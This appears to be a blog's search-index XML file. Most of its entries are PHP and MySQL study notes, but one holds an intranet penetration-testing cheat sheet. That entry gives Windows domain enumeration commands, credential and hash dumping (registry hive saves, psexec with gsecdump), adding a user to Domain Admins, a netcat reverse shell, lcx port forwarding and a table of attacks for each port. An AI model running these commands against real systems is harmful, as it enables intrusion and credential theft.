<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[OAuth的一点点理解]]></title>
    <url>%2F2019%2F09%2F02%2FOAuth%E7%9A%84%E4%B8%80%E7%82%B9%E7%82%B9%E7%90%86%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[OAuth的原理和授权流程 OAuth(开发授权)是一个开放标准，它的意思是允许第三方网站在用户授权的前提下访问用户在某一网站上存储的各种私密信息（如照片，视频，联系人列表）等，而这种授权无需将用户名和密码提供给第三方应用，如我们常见的QQ登入、微信登入等。目前我们常见的版本为OAuth2.0，OAuth2.0认证和授权的过程中存在四个非常重要的角色，它们分别是Resource Owner：资源的拥有者，即用户，Client：第三方接入应用，Resource Server：数据获取的服务器，Authorization Server：认证服务器。 OAuth2.0认证和授权的运行流程： 当Resource Owner(用户)访问Client(第三方接入应用)时，Client会要求用户进行授权，然后用户会连接到认证服务器进行授权，授权成功后认证服务器将会携带Auth Code重定向到Client，Client收到Auth Code后将会向认证服务器请求Access Token，然后认证服务器再返回Access Token，接下来Client就能拿到这个token去Resource server存取用户资源了。 授权的四种模式：授权码模式（authorization code）、简化模式（implicit grant type）、密码模式（Resource Owner Password Credentials Grant） 图中我们可以看到，百度提供了QQ和微博两种第三方登入方式。这两个就是OAuth服务的提供平台，也即是Authorization Server，而百度就是Client。·、Resource server是QQ、微博。 OAuth2.0的常见漏洞以及具体案例：是OAuth平台自身的漏洞，这类漏洞通常是由于OAuth提供者对redirect_uri这个参数的过滤不严，导致授权成功后跳转到非预期的域名，从而使认证码或token被泄露。 wooyun-2014-059403、wooyun-2014-059427、wooyun-2014-059639、wooyun-2014-059676腾讯OAuth平台redirect_uri过滤不严可能导致用户信息遭窃取.看完了四个案例，我们来总结一下关于OAuth平台自身的漏洞的常见绕过方式：Bypass的思维导图如下所示： OAuth2.0配合CSRF劫持第三方账号： 这类漏洞常见于绑定账号处，由于绑定请求处存在CSRF漏洞，导致该请求能被恶意伪造，使得受害者在不知情的情况下将自己的应用账号绑定到攻击者的账号上。 攻击者用自己的账号向服务器发送绑定请求来进行账号绑定，当认证完成后，OAuth提供方会返回给第三方一个auth code作为确认绑定的依据，并携带在一个URL中。当用户访问这个URL之后，就会完成绑定的最后操作。wooyun-2014-054888天涯–新浪OAuth 2.0 redirect_uir CSRF 漏洞wooyun-2015-0145396知乎某处OAuth的身份劫持漏洞]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>OAuth</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[内网渗透基础知识]]></title>
    <url>%2F2019%2F08%2F26%2F%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%2F</url>
    <content type="text"><![CDATA[内网渗透基础知识前言 了解一下内网的ip分配。。。。。。 内网常用的三种ip：A类 10.0.0.0–10.255.255.255B类 172.16.0.0–172.31.255.255C类 192.168.0.0–192.168.255.255 什么是域控制器 域控制器是指在“域”模式下，至少有一台服务器负责每一台联入网络的电脑和用户的验证工作，相当于一个单位的门卫一样，称为域控制器（Domain Controller，简写为DC） 在域中拥有最高权限，它能对域中的所有计算机进行操作和管理。 一、内网中常用的系统命令1.内网网络探测常用命令 12345678910tracert IP //路由跟踪 route print //打印路由表 arp -a //列出本网段内所有活跃的IP地址 arp -s (ip + mac) //绑定mac与ip地址 arp -d (ip + mac) //解绑mac与ip地址 nbtscan -r 192.168.16.0/24 //通过小工具nbtscan扫描整个网络 netsh firewall show config //查看防火墙策略 netsh firewall show state //查看防火墙策略for /l %i in (1,1,255) do @ping 192.168.10.%i -w 1 -n 1 | find /i &quot;ttl&quot; //探测存活主机 2.windows操作命令 1234567891011121314151617181920212223242526272829303132net group /domain //获得所有域用户组列表net group xxx /domain //显示域中xxx组net group xxx /del /domain //删除域中xxx组net group xxx nx /del /domain //删除域内xxx组中的成员nxnet group xxx /add /domain //添加域中的群组xxxnet group &quot;domain admins&quot; /domain //获得域管理员列表net group &quot;enterprise admins&quot; /domain //获得企业管理员列表net localgroup administrators /domain //获得域内置administrators组用户net group &quot;domain controllers&quot; /domain //获得域控制器列表net group &quot;domain computers&quot; /domain //获得所有域成员计算机列表net user /domain //获得所有域用户列表net user xxx /domain //获得账户xxx的详细信息net accounts /domain //获得域密码策略设置，密码长短，错误锁定等信息net view /domain //查询有几个域，查询域列表net view /domain:xxx //查看xxx域中的计算机列表nltest /domain_trusts //获取域信任信息net user domain-admin /domain //查看域管理员登录时间，密码过期时间，是否有登录脚本，组分配等信息net config workstation //查询机器属于哪个域net time /domain //查询主域服务器的时间echo %logonserver% //查看登入到这台服务器的计算机名net time \\192.168.1.1 //查询远程共享主机192.168.1.1的时间net use \\ip\ipc$ password /user:username@domain //ipc$域内连接net view \\xxx.ggg.com //查看域控共享情况dir \\dc2.backlion.com\SYSVOL /s /a &gt; sysvol.txt //列出sysvol日志记录 xcopy \\dc2.backlion.com\sysvol.txt sysvol.txt /i /e /c//远程拷贝到本地sysvol日志 net user /domain bk bk123 //修改域内用户密码，需要管理员权限 net localgroup administartors SEZKL\backlion /add //将SEZKL域中的用户backlion添加到administrators组中 mstsc /admin //远程桌面登录到console会话解决hash无法抓出问题 gpupdate/force //更新域策略 psexec \\192.168.1.3 -u administrator -p bk1234 -c gsecdump.exe -u //从域服务器密码存储文件windows/ntds/ntds.dit导出hash值出来 gsecdump -a //获取域登管理员登录过得hash值，这里gescdump为第三方导出AD域的hash值 tasklist /S ip /U domain\username /P /V //查看远程计算机进程列 普通域用户提升为域管理员:net group &quot;Domain Admins&quot; xxx /add /domain 3.基本内网渗透命令 123456789101112131415161718192021222324252627282930313233343536373839404142ipconfig /all //查看ip地址ipconfig /release //释放地址ipconfig /renew //重新获取ip地址whoami //查询账号用户名whoami /all //查看sid值systeminfo //查询系统以及补丁信息tasklist /svc //查看进程taskkill /im 进程名称(cmd) //结束进程taskkill /pid[进程码] -t(结束该进程) -f(强制结束该进程以及所有子进程)wmic qfe get hotfixid //查看已安装的补丁wmic qfe list full /format:htable &gt; hotfixes.htm //详细的补丁安装wmic qfe //查询补丁信息以及微软提供的下载地址net start //查看当前运行的服务net user //查看本地组的用户net localgroup administrators //查看本机管理员组有哪些用户net use //查看会话net session //查看当前会话net share //查看SMB指向的路径[即共享]wmic share get name,path //查看SMB指向的路径wmic nteventlog get path,filename,writeable //查询系统日志文件存储位置 net use \\IP\ipc$ password /user:username //建立IPC会话（工作组模式） net use z: \\192.168.1.1 //建立映射到本机Z盘 net time \\172.16.16.2 //查询共享主机的是 at \\172.16.16.2 13:50 c:\windows\2009.exe //在共享主机上执行 netstat -ano //查看开放的端口 netstat -an | find “3389” //找到3389端口 net accounts //查看本地密码策略 nbtstat –A ip //netbiso查询 net view //查看机器注释或许能得到当前活动状态的机器列表，如果禁用netbios就查看不出来 echo %PROCESSOR_ARCHITECTURE% //查看系统是32还是64位 set //查看系统环境设置变量 net start //查看当前运行的服务 wmic service list brief //查看进程服务 wmic process list brief //查看进程 wmic startup list brief //查看启动程序信息 wmic product list brief //查看安装程序和版本信息（漏洞利用线索） wmic startup list full //识别开机启动的程序 wmic process where(description=&quot;mysqld.exe&quot;) &gt;&gt;mysql.log //获取软件安装路径 for /f &quot;skip=9 tokens=1,2 delims=:&quot; %i in (&apos;netsh wlan showprofiles&apos;) do @echo %j | findstr -i -v echo | netsh wlan show profiles %jkey=clear //一键获取wifi密码 if defined PSModulePath (echo 支持powershell) else (echo 不支持powershell) //查看是否支持posershell qwinsta //查看登录情况set KB2829361=MS13-046&amp;set KB2830290=MS13-046&amp;set KB2667440=MS12-020&amp;set KB2667402=MS12-020&amp;set KB3124280=MS16-016&amp;set KB3077657=MS15-077&amp;set KB3045171=MS15-051&amp;set KB2592799=MS11-080&amp;set KB952004=MS09-012 PR&amp;set KB956572=MS09-012 巴西烤肉&amp;set KB970483=MS09-020 iis6&amp;set KB2124261=MS10-065 ii7&amp;set KB2271195=MS10-065 ii7&amp;systeminfo&gt;a.txt&amp;(for %i in (KB952004 KB956572 KB2393802 KB2503665 KB2592799 KB2621440 KB2160329 KB970483 KB2124261 KB977165 KB958644 KB2667402 KB2667440 KB2830290 KB2829361 KB3045171 KB3077657 KB3124280)do @type a.txt|@find /i &quot;%i&quot;||@echo %%i% Not Installed!)&amp;del /f/q /a a.txt //windows未打补丁情况 4.导出注册表的命令 1reg save hklm\sam sam.hive &amp; reg save hklm\system system.hive &amp; reg save hklm\security security.hive 二、内网测试中代理与端口转发正向代理Lhost ——&gt; proxy ——&gt; Rhost Lhost为了访问到Rhost，向proxy发送了一个请求并且指定目标是Rhost，然后proxy向Rhost转交请求并将获得的内容返回给Lhost，简单来说正向代理就是proxy代替了我们去访问Rhost。 正向代理就像一个跳板，比如ABC三个IP，A能访问B，B能访问C，A不能访问C，那么，正向代理就是A去访问B，告诉B自己要访问C的什么内容，然后B去代替A来访问，接着把访问到的内容返回给A，这样就相当于A访问到了C。 反向代理Lhost &lt;——&gt; proxy &lt;——&gt; firewall &lt;——&gt; Rhost 反向代理是我们经常用到的一种代理方式，因为它可以有效的穿透防火墙，这也是很多网站保护集群的一种做法，他们将内网中的web（A）代理到外网的一台服务器（B）上，当用户访问这台服务器（B）时，他们以为自己访问的是原始的web（A）。 windows lcx端口转发 lcx常用命令：1234561: -listen &lt;ConnectPort1&gt; &lt;TransmitPort2&gt;监听p1,接收由p2转发过来的数据 2: -tarn &lt;ConnectPort&gt; &lt;TransmitHost&gt; &lt;TransmitPort&gt;端口转向功能，通过访问该端口可以直接与该主机或另一台主机的某一个端口进行通信3: -slave &lt;TransmitHostB&gt; &lt;PortB&gt; &lt;TransmitHostA&gt; &lt;PortA&gt; 端口转发功能，将目标A机上的端口A,转发到外网B机的端口B上 内网上执行：lcx.exe –slave 192.168.100.101 8888 192.168.100.111 3389 NC反弹CMDshell(netcat) 靶机上输入：nc.exe -l -p 8888 -e cmd.exe将cmd.exe转发到8888端口 攻击机输入：nc.exe -nvv 192.168.100.101 8888连接到靶机的8888端口(获取cmd.exe的执行权限) 反向连接： 攻击机输入：nc.exe -l -p 8888监听本地8888端口 靶机上输入：nc.exe -e cmd.exe 192.168.100.100 8888将靶机的cmd.exe转发到攻击机的8888端口 三、如何内网信息收集拿下边界机器后，我们首先要明白的是：这台边界机器在内网中处于什么地位，内网的架构是什么样子，判断有没有域，只要找到域控，拿下域控，便可以操控整个域。 首先我们获取当前组的计算机名 net view 这个命令可以查看同一域/工作组的计算机列表， 然后我们可以查看当前的计算机名、用户名、系统版本、工作站域、登陆域等等 通过 net view /domain 这个命令我们可以看有哪些域。 查询指定域列表: net view /domain:contoso 通过计算机名获取其Ip地址: ping –n 1 DC1 -4 Ping命令扫描计算机数量: for /l %i in (1,1,255) do @ping 192.168.100.%i -w 1 -n 1 | find /i &quot;ttl&quot; 以下命令在执行的时候会发送到域控中查询,如果渗透的机器不是域用户权限，则会出现报错（比如下面我们会创建一个linen用户） 查看域中的用户名: net user /domain 查询域组名称： net group /domain 添加域管理员账号:我们先添加普通域用户net user 用户名 密码 /add /domain 普通域用户提升为域管理员: net group &quot;Domain Admins&quot; linen /add /domain 查看域控制器: net group &quot;Domain controllers&quot; 查询所有计算机名称: dsquery computer 寻找域控的方式有很多种方式。比如说一般的域控也是DNS主机，我们看一下DNS的IP就能确定域控。又比如net time /domain 这个命令是通过时间服务器来寻找域控，又或者用命令net group &quot;Domain Controllers&quot; /domain来查找域控 四、端口与服务 端口号 端口说明 攻击技巧 21/22/69 ftp/tftp：文件传输协议 爆破\嗅探\溢出\后门 22 ssh：远程连接 爆破OpenSSH；28个退格 23 telnet：远程连接 爆破\嗅探 25 smtp：邮件服务 邮件伪造 53 DNS：域名系统 DNS区域传输\DNS劫持\DNS缓存投毒\DNS欺骗\利用DNS隧道技术刺透防火墙 67/68 dhcp 劫持\欺骗 110 pop3 爆破 139 samba 爆破\未授权访问\远程代码执行 143 imap 爆破 161 snmp 爆破 389 ldap 注入攻击\未授权访问 512/513/514 linux r 直接使用rlogin 873 rsync 未授权访问 1080 socket 爆破：进行内网渗透 1352 lotus 爆破：弱口令\信息泄漏：源代码 1433 mssql 爆破：使用系统用户登录\注入攻击 1521 oracle 爆破：TNS\注入攻击 2049 nfs 配置不当 2181 zookeeper 未授权访问 3306 mysql 爆破\拒绝服务\注入 3389 rdp 爆破\Shift后门\0708 4848 glassfish 爆破：控制台弱口令\认证绕过 5000 sybase/DB2 爆破\注入 5432 postgresql 缓冲区溢出\注入攻击\爆破：弱口令 5632 pcanywhere 拒绝服务\代码执行 5900 vnc 爆破：弱口令\认证绕过 6379 redis 未授权访问\爆破：弱口令 7001 weblogic Java反序列化\控制台弱口令\控制台部署webshell 80/443/8080 web 常见web攻击\控制台爆破\对应服务器版本漏洞 8069 zabbix 远程命令执行 9090 websphere控制台 爆破：控制台弱口令\Java反序列 9200/9300 elasticsearch 远程代码执行 11211 memcacache 未授权访问 27017 mongodb 爆破\未授权访问]]></content>
      <tags>
        <tag>学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[centos安装msf]]></title>
    <url>%2F2019%2F08%2F19%2Fcentos%E5%AE%89%E8%A3%85msf%2F</url>
    <content type="text"><![CDATA[centos安装msf的一个笔记以前都是使用kali的msf，没有自己安装过，现在我使用centos系统，了解一些安装过程。百度了一下安装的教程，跟着操作了一下。有一些坑。 第一步、下载包wget https://downloads.metasploit.com/data/releases/metasploit-latest-linux-x64-installer.run 给予这个包执行的权限：chmod +x metasploit-latest-linux-x64-installer.run 运行这个文件./metasploit-latest-linux-x64-installer.run之后基本回车就可以，有选择y/n的选y。 第二步、安装postgresql由于msf需要使用postgresql，所以需要安装并配置它。这里是真的坑。搞得我还原了几次系统。 首先安装postgresql-server这个包：yum install -y postgresql-server安装完就开始配置了初始化数据库: 1234567891011121314151617[root@localhost ~]# postgresql-setup initdb[root@localhost ~]# su - postgres-bash-4.2$ whoamipostgres-bash-4.2$ pg_ctl -D /var/lib/pgsql/data start正在启动服务器进程-bash-4.2$ psql -p 5432psql (9.2.24)输入 &quot;help&quot; 来获取帮助信息.postgres=# \password postgres输入新的密码：再次键入： 创建msf用户和msf数据库： 创建用户 msf，密码msf，数据库msf，赋予登入权限 12345postgres=# create user msf with password &apos;msf&apos;;postgres=# create database msf owner msf;postgres=# alter role msf login; \q可以退出postgresql命令。 修改配置文件 ，否则无法登录数据库：123[root@localhost ~]# find / -name pg_hba.conf[root@localhost ~]# vi /var/lib/pgsql/data/pg_hba.conf 【注意】现在必须重启数据库: 1234[root@localhost ~]# su - postgres上一次登录：一 8月 19 12:52:51 CST 2019pts/0 上-bash-4.2$ pg_ctl -D /var/lib/pgsql/data restart 现在切换到root用户使用这条命令查看新创建的用户是否可以连接数据库： [root@localhost ~]# psql -U msf -d msf -h 127.0.0.1 -p 5432可以连接，进行下一步： 查找msf的数据库配置文件，并修改配置： 12345678910[root@localhost ~]# find / -name database.yml.example/opt/metasploit/apps/pro/ui/config/database.yml.example/opt/metasploit/apps/pro/vendor/bundle/ruby/2.6.0/gems/metasploit-framework-4.17.73/config/database.yml.example/opt/metasploit/apps/pro/vendor/bundle/ruby/2.6.0/gems/metasploit-credential-2.0.14/spec/dummy/config/database.yml.example/opt/metasploit/apps/pro/vendor/bundle/ruby/2.6.0/gems/metasploit_data_models-2.0.17/spec/dummy/config/database.yml.example/opt/metasploit/apps/pro/vendor/bundle/ruby/2.6.0/gems/metasploit-model-2.0.4/spec/dummy/config/database.yml.example[root@localhost ~]# cp /opt/metasploit/apps/pro/vendor/bundle/ruby/2.6.0/gems/metasploit-framework-4.17.73/config/database.yml.example /opt/metasploit/apps/pro/vendor/bundle/ruby/2.6.0/gems/metasploit-framework-4.17.73/config/database.yml[root@localhost ~]# vi /opt/metasploit/apps/pro/vendor/bundle/ruby/2.6.0/gems/metasploit-framework-4.17.73/config/database.yml 更改配置为：123456789development: &amp;pgsql adapter: postgresql database: msf username: msf password: msf host: localhost port: 5432 pool: 200 timeout: 5 完成配置，重启metasploit与postgresql 即可完成数据库配置]]></content>
      <tags>
        <tag>环境安装</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[php数组指针]]></title>
    <url>%2F2019%2F01%2F03%2Fphp%E6%95%B0%E7%BB%84%E6%8C%87%E9%92%88foreach%2F</url>
    <content type="text"><![CDATA[foreach数组指针 1.指针其实也是一个变量，用来保存某个元素的地址。指针可以移动。2.默认情况下，打开一个数组，指针会指向数组的第一个元素。语法结构foreach(数组 as 键=&gt;值){ 循环体 } 流程图 foreach是循环，break和continue也适用于foreach循环 foreach值变量支持传地址 注意：键变量不支持传地址。 foreach循环变量数组的时候，遍历的是数组的拷贝 数组指针的操作 1.key() —— 从关联数组中取得键名，没有取到返回NULL。2.current() – 返回数组中的当前单元3.next() —– 返回数组中的当前单元4.prev() —– 将数组的内部指针倒回一位5.reset() —- 将数组的内部指针指向第一个单元6.end() —— 将数组的内部指针指向最后一个单元 例题：将数组的元素从后往前取 注意：如果一个数组连续输出两次，必须要将指针复位。 each()函数的使用 1.返回数组当前的键/值对并将数组指针向前移动一步，如果内部指针穿越了数组的末尾返回false 2.键值对返回4个单元，其中包含索引数组和关联数组，下标是key和0的是键，下标是1和value的是值。3.each()=key()+current()+next()4.如果第二次再遍历，必须通过reset()复位指针。 通过while+each遍历数组]]></content>
      <tags>
        <tag>php学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[php字符串操作函数]]></title>
    <url>%2F2019%2F01%2F03%2Fphp%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%93%8D%E4%BD%9C%E5%87%BD%E6%95%B0%2F</url>
    <content type="text"><![CDATA[[]用下标操作字符串 字符串可以理解成字符集合，所以可以通过[]来访问。不能操作中文。 strlen() 返回字符串长度，以字节为单位。 注意：在gbk下一个汉字2个字节，在utf-8下一个汉字3个字节。 trim()、ltrim()、rtrim():去除空白字符 trim():去字符串两边的把空格 ltrim():去字符串左边的空格 rtrim():去字符串右边的空格 strpos(),strrpos() strpos():查找字符串首次出现的位置strrpos(): 查找字符串最后一次出现的位置 str_repeat():重复字符串 chr()和ord() substr(字符串,开始位置,截取长度):截取字符串 strchr()、strrchr()：截取字符串 应用：截取文件后缀名 str_replace():替换字符串 str_split():将字符串分割成数组 str_pad(带填充字符串,总位数,填充字符,填充位置):填充字符串 字符串大小写转换(strtolower():转换成小写、strtoupper():转换成大写) nl2br():将字符串的换行转成 htmlspecialchars():将HTML字体转成实体 urlencode()、urldecode():url编码和解码 多字节字符串处理函数 PHP默认本身不支持多字节处理。要开启扩展(multibytes)以mb_开头的函数都在多字节处理函数。 mb_strlen():获取字符串长度 注意：需要设置字符编码，默认字符编码为ISO-8859-1. mb_internal_encoding():设置/获取内部字符编码 mb_strpos():查找字符串在另一个字符串的位置 mb_substr():获取字符串 字符串编码iconv(输入的编码,输出的编码,字符串)]]></content>
      <tags>
        <tag>php学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[php多态]]></title>
    <url>%2F2019%2F01%2F03%2Fphp%E5%A4%9A%E6%80%81%2F</url>
    <content type="text"><![CDATA[多态面向对象的三大特性：封装、继承、多态。多态就是多种形态，多态分为方法重写和方法重载。但是PHP不支持方法重载 方法重写子类重写了父类的同名的方法12345678910111213class Person&#123; public function show()&#123; echo '你好啊！'; &#125;&#125;class Student extends Person&#123; public function show()&#123; //方法重写 echo "我是学生！"; &#125;&#125;$a = new Student;$a -&gt; show();//这是学生类 1、子类和父类的方法名必须一致2、子类重写的方法可以和父类方法的参数个数不一致 3、子类重写的方法可以和父类方法的参数个数不一致 方法重载注意：php不支持方法重载 私有属性的继承和重写]]></content>
      <tags>
        <tag>php学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[php操作mysql]]></title>
    <url>%2F2019%2F01%2F03%2Fphp%E6%93%8D%E4%BD%9Cmysql%2F</url>
    <content type="text"><![CDATA[php操作mysql php本身不能操作mysql，但是php有扩展可以实现操作mysql。php操作mysql的扩展：mysql，mysqli和PDO扩展。mysql扩展：纯面向过程，里面都是函数，加载扩展后可以调用函数。mysqli扩展：面向过程+面向对象，里面有函数也有类，加载扩展后可以选择调用函数或调用类操作PDO:纯面向对象，只有类，加载后只能调用类。mysql扩展在php5.5之后就移除了，小伙伴注意了。 当php来对mysql进行操作之后：php的角色是mysql的一个客户端 客户端操作服务端有必要的流程 连接认证：数据库连接资源 mysql_connect(服务器地址包含端口,用户名,用户密码);默认的：mysql_connect会产生一个连接资源，即便是重新连接，也会返回原有的连接资源如果真的想产生多一个连接：是新的可以在mysql_connect函数的第四个参数控制：true php发送sql指令（等待执行结果） mysql服务端接收指令，执行指令，返回结果 php接收结果mixed mysql_query(sql指令); boolean结果;sql指令没有返回值，布尔true结果只能代表sql语句没有语法错误，false就代表是sql语句有语法错误：主增删改resource结果：结果集资源，sql指令有结果返回(show,select)，结果集永远为true，主查询 php没有办法直接使用结果集：需要解析结果集mysql扩展提供了一系列函数：mysql_fetch系列：任何操作都是指针操作：操作完就会指针下移。mysql_fetch_array:默认获取混合数组，有一组关联，有一组索引。当前函数可以实现：只获取关联数组或者索引数组。通过第二个参数限制：MYSQL_BOTH是默认的，MYSQL_ASSOC是关联数组，MYSQL_NUM是索引数组。关联数组获取：MYSQL_ASSOC索引数组获取：MYSQL_NUMmysql_fetch_row:获取索引数组mysql_fetch_assoc:直接获取关联数组不管是哪个fetch：最终如果结果集指针移动到最后，返回都是false 如果指针已经移动到最后，那么需要重置指针实现其他操作。mysql_data_seek(结果集资源，位置从0开始); 获取的数据往往只有一行：实际上查多少是为了显示全部：解析全部，循环遍历来实现。 释放资源：mysql资源通常不需要释放(脚本执行周期不会太长，但是数据库的操作是贯穿整个脚本的)mysql_close(资源变量); 增删改查 从计算机角度出发：增删改都属于写，查属于读。 写操作: 连接认证：不一定连接成功，需要对结果进行判断，可以直接使用三目运算(逻辑或)来进行处理，但是无法获取错误信息。 如果要获取错误信息，那么需要使用mysql提供的获取错误的函数： mysql_errno():获取错误编号，mysql_error():获取错误信息。]]></content>
      <tags>
        <tag>php学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[php包含文件]]></title>
    <url>%2F2019%2F01%2F03%2Fphp%E5%8C%85%E5%90%AB%E6%96%87%E4%BB%B6%2F</url>
    <content type="text"><![CDATA[php包含文件 在网站中有相同的banner，版权等等页面，我们可以将相同的页面做成包含文件，在展示的页面中包含即可。 包含文件相当于将文件的内容复制到页面中，如果包含文件有,包含后，页面中就不止一个页面结构了。这与W3C定义的规范不符合，所以在包含文件中不能出现页面的结构。 包含文件的语法 1.include() ——— 可以包含多次2.require() ——— 可以包含多次3.include_once() —- 只能包含一次4.require_once() —- 只能包含一次 require和include的区别 相同点：可以包含多次不同点：require遇到错误停止执行，include遇到错误继续执行。 ./目录/文件和目录/文件的区别 这两种写法的效果基本是一样的，不带./的路径受到include_path配置的影响。 可以通过set_include_path()来设置包含文件所在的目录。set_include_path() —- 设置包含文件的目录get_include_path() —- 获取包含文件的目录设置include_path的作用：1、将项目的经常使用的文件放到一个统一的目录下，然后通过include_path指向此文件夹，就不用写很长的地址字符串。2.将安全性高的文件放到站点外，通过include_path指向此目录。比如连接数据库文件。 终止脚本执行 exit和die():exit，终止脚本执行，die(),终止后可以输出一个字符串。return:终止当前页面的执行。]]></content>
      <tags>
        <tag>php学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Apache的下载与安装]]></title>
    <url>%2F2019%2F01%2F03%2FApache%E7%9A%84%E4%B8%8B%E8%BD%BD%E4%B8%8E%E5%AE%89%E8%A3%85%2F</url>
    <content type="text"><![CDATA[一、Apache官网下载Apache HTTP Server服务器 1.打开Apache官网：http://www.apache.org选择第一项ApacheHaus，这是个第三方下载平台，在它的网站下载独立的Apache会是一个压缩包。另外四个中，第二个也是独立的Apache下载地址，另外三个是集成开发环境。本人选的第一个。在新的界面中，会发现VC9和VC11字样，通过阅读相关内容得知，VC9是指用VS2008编译的代码，而VC11是用VS2012编译的，而用VS2012编译的无法在Windows XP和Server 2003中使用。算是为了兼容性好点吧，本人选的用VC9编译的32位Apache，选择下载至此，下载过程完成！ 二、Apache服务器的安装 Apache下载完成后，进行解压缩。 解压文件放到一个文件夹，我放到c:\wamp文件夹下。解压后文件夹名我设置为Apache。 三、Apache的配置 打开httpd.conf文件（在conf文件夹下）1.修改目录位置，如下图： 若你的80端口被占用（可以在cmd下用命令netstat -a查看），可以把默认apache端口改掉 2.配置安装Apache的主服务，这样Apache才能启动。以管理员身份打开cmd窗口，到apache的bin目录下，输入：httpd.exe -k install -n apache。这条命令是安装apache服务，并将该服务名命名为apache（你也可以改为你喜欢的名称）。其中，Errors reported here must be corrected before the service can be started.意思是，此处报告的错误必须在服务开始前进行纠正。若没有，则成功。 四、Apache服务器的启动 配置好Apache服务器之后，就可以启动服务器，windows下Apache服务器的启动： 1.利用命令启动注意：这里如果你的服务名有改动的话，就需要指定服务名。-n是指定服务名。 2.利用Apache服务器自身的程序打开：在bin目录下的ApacheMonitor.exe,打开 打开浏览器，输入http://localhost,若出现如下图的界面，则Apache服务器的基本配置完毕。 配置环境变量 我的电脑右键属性将apache的bin目录放到path中，用”;”分隔。执行过程：当在命令行输入一个命令的时候，先到当前目录下查找当前命令，如果有就执行，如果没有就到环境变量中找path路径，path中有很多命令的路径，默认在从左往右依次寻找。]]></content>
      <tags>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[mysql高级操作]]></title>
    <url>%2F2018%2F12%2F29%2Fmysql%E9%AB%98%E7%BA%A7%E6%93%8D%E4%BD%9C%2F</url>
    <content type="text"><![CDATA[外键外键：foreign key，外面的键（键不在自己表中）：如果一张表中有一个字段（非主键）指向另外一张表的主键，那么将该字段称之为外键。 增加外键外键可以在创建表的时候或者创建表之后增加（但是要考虑数据的问题）。一张表可以有多个外键。 创建表的时候增加外键：在所有的表字段之后，使用foreign key(外键字段)references 外部表(主键字段)在新增表之后增加外键：修改表结构alter table 表名 add[constraint 外键名] foreign key(外键字段) references 父表(主键字段); 修改外键&amp;删除外键外键不可修改：只能先删除后新增删除外键语法:alter table 表名 drop foreign key 外键名; 一张表中可以有多个外键，但是名字不能相同 外键作用外键默认的作用有两点：一个对父表，一个对字表(外键字段所在的表)对字表约束：子表数据进行写操作(增和改)的时候，如果对应的外键字段在父表找不到对应的匹配：那么操作会失败（约束字表数据操作）对父表约束：父表数据进行写操作(删和改：都必须涉及到主键本身)，如果对应的主键在子表中已经被数据所引用，那么就不允许操作]]></content>
      <tags>
        <tag>php学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[mysql操作]]></title>
    <url>%2F2018%2F12%2F29%2Fmysql%E6%93%8D%E4%BD%9C%2F</url>
    <content type="text"><![CDATA[SQL基本操作库的操作新增数据库 基本语法create database 数据库名 [库选项]库选项：用来约束数据库，分为两个选项： 字符集设定：charset/character set 具体字符集(数据存储的编码格式)：常用字符集GBK、utf-8 校对集设定：collate 具体校对集(数据比较的规则) 查看数据库 查看所有数据库：show databases;查看指定部分的数据库： 模糊查询： show databases like ‘pattern’; –pattern是匹配模式 %：表示匹配多个字符 _：表示匹配单个字符 查看数据库的创建语句：show create database 数据库名; 更新数据库 数据库名字不可以修改数据库的修改仅限库选项：字符集和校对集(校对集依赖字符集)alter database 数据库名字 [库选项];charset/character set[=] 字符集collate 校对集 删除数据库 drop database 数据库名; 表操作新增数据表 create table [if not exists] 表名(字段名 数据类型,字段名 数据类型)[表选项]；if not exists :如果表名不存在，那么就创建，否则不执行创建代码：检查功能表选项：控制表的表现 字符集：charset/character set 具体字符集; 保证表中数据储存的字符集 校对集：collate 具体校对集; 存储引擎：engine 具体的存储引擎(innodb和myisam) 当创建数据表的SQL指令执行之后，到底发生了什么？ 1.指定数据库下已经存在对应的表 2.在数据库对应的文件夹下，会产生对应表的结构文件(跟存储引擎有关系) 查看数据表 查看所有表：show tables;查看部分表：模糊匹配：show tables like &#39;pattern&#39;;查看表的创建语句：show create table 表名;查看表结构：查看表中的字段信息 desc/describe/show columns from 表名; 修改数据表 修改表本身: 修改表名：rename table 旧表名 to 新表名; 修改表选项： alter table 表名 表选项 [=] 值; 修改字段：​ 新增字段：alter table 表名 add [cloumn] 字段名 数据类型 [列属性][位置];​ 位置：字段名可以存放表中的任意位置​ first：第一个位置​ after：在哪个字段之后：after 字段名;默认的是在最后一个字段之后​ 修改字段：修改通常是修改属性或者数据类型​ alter table 表名 modify 字段名 数据类型 [属性][位置];​ 重命名字段：alter table 表名 change 旧字段 新字段 数据类型 [属性][位置];​ 删除字段：alter table 表名 drop 字段名;删除数据表： drop table 表名1,表名2...; 可以一次删除多个表 数据操作 新增数据 方法1：insert into 表名 values(值列表)[,(值列表)...]; 方法2：insert into 表名(字段列表)values(值列表)[,(值列表)...]; 查看数据： select */字段列表 from 表名 [where 条件]; select distinct 字段 from 表名 ——-根据字段筛选数据 更新数据： update 表名 set 字段 = 值 [where 条件]; 删除数据： delete from 表名 [where 条件]; 校对集问题 校对集：数据比较的方式校对集有三种方式： _bin: binary,二进制比较，取出二进制位，一位一位的比较，区分大小写。 _cs: case sensitive,大小写敏感。 _ci: case insensitive，大小写不敏感。 查看数据库所支持的校对集：show collation; 只有当数据产生比较的时候，校对集才会生效。 比较：根据某个字段进行排序：order by 字段名 [asc|desc]; asc是升序，desc是降序，默认是升序 字段属性主键 主键：primary key,主要的键，一张表只能有一个字段可以使用对应的键，用来唯一的约束该字段里面的数据，不能重复：这种称之为主键 增加主键： sql操作中有多种方式可以给表增加主键：大体分为三种： 